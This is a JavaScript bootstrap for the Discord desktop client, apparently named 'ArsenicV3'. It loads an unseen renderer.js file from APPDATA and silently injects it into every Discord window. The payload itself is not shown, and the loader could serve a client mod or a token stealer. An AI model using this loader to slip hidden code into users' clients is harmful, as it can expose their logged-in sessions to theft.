'use strict';
(function () {
  if (process.__AV3_BOOTSTRAP__) return;
  process.__AV3_BOOTSTRAP__ = true;

  var fs = require('fs');
  var path = require('path');
  var electron = require('electron');
  var app = electron.app;

  var DIR = path.join((process.env.APPDATA || app.getPath('appData')), 'ArsenicV3-Dsc');
  var PAYLOAD = path.join(DIR, 'renderer.js');
  var CONFIG = path.join(DIR, 'config.json');

  function loadConfig() {
    try { return JSON.parse(fs.readFileSync(CONFIG, 'utf8')); } catch (e) { return null; }
  }
  function saveConfig(cfg) {
    try { fs.writeFileSync(CONFIG, JSON.stringify(cfg, null, 2)); } catch (e) { }
  }
  var cfg = loadConfig();
  if (!cfg || typeof cfg !== 'object') {
    cfg = { v: 2, enabled: true };
    saveConfig(cfg);
  }
  if (typeof cfg.enabled !== 'boolean') cfg.enabled = true;

  var payload = null;
  try {
    payload = fs.readFileSync(PAYLOAD, 'utf8');
  } catch (e) { payload = null; }

  function looksLikeDiscordUrl(url) {
    if (!url) return false;
    return url.indexOf('discord.com') !== -1 ||
           url.indexOf('discordapp') !== -1 ||
           url.indexOf('app://') === 0;
  }

  app.on('web-contents-created', function (_e, wc) {
    if (!payload) return;

    wc.on('did-finish-load', function () {
      var url = '', type = '';
      try { url = wc.getURL() || ''; } catch (e) { }
      try { type = wc.getType(); } catch (e) { }
      if (type !== 'window') return;
      if (!looksLikeDiscordUrl(url)) return;
      if (wc.__av3Injected) return;
      wc.__av3Injected = true;
      var script = 'window.AV3_CONFIG = ' + JSON.stringify(cfg) + ';\n' + payload;
      wc.executeJavaScript(script, true).catch(function () { });
    });
  });
})();
